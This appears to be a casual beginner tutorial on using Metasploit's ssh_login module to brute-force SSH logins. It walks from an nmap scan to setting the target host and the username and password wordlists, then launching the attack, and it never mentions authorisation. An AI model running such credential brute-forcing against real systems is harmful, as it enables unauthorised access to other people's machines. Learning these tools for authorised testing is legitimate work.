<h1 style="text-align: center;">Offensive Strategies</h1>
## Metasploit
Let's install on my device! I use 󰣇 Arch btw
```bash
yay -Sy metasploit
```
Type `msfconsole` to open metasploit!
You might find something simmilar to shown below.
![[Pasted image 20240622100736.png]]
Type `exit` to exit.
Now, you've learnt how to open and close the tool. So, let's deep dive into it.
Inside your terminal, type the below command with the target's ip...
```bash
nmap  127.0.0.1
```
what do you see?
Anything simmilar ?
![[Pasted image 20240622101458.png]]
We can see ssh port 22 open. Booyah! 
Well see how to utilize the port to break into the system. We'll apply brute force attack to get a control over the target system. Let's proceed!
type `search ssh_login` to see possible methods of exploit...
![[Pasted image 20240622102045.png]]
Now, copy the desired one and `use` that:
![[Pasted image 20240622102337.png]]
The `use` command is for utilizing a feature available on your metasploit tool.
Now, Type:
```bash
show options
```
You will see the following results:
![[Pasted image 20240622102526.png]]
Now, use the `set` command to set your preferences. I'll set mine. You can follow that or If you have specific needs, you'll proceed with yours.
- set the host IP
```bash
set RHOSTS 192.168.0.100 
```
- set verbose mode on
```bash
set VERBOSE true
```
- stop on success
```bash
set STOP_ON_SUCCESS true
```
- Now, here comes the most important part. Setting the wordlist file.
```bash
set USER_FILE ~/<path>/<to>/<yourfile>/dict.txt
set PASS_FILE ~/<path>/<to>/<yourfile>/pass.txt
```
see....
![[Pasted image 20240622103729.png]]
You've finished setting your system to perform next brute force attack. 
Type `exploit` to launch the attack!
![[Screenshot_20240622_103902.png]]
Done Hacking the remote system!
you can Explore the system by basic Linux commands! go Ahead...
Let's examine the target!
![[Pasted image 20240622104140.png]]
_Congratulations_, You've finished Hacking the device!
A demo video on the whole process..
![[2024-06-22 11-10-39.mp4]]
<h4 style="text-align: center;">Thank you </h4>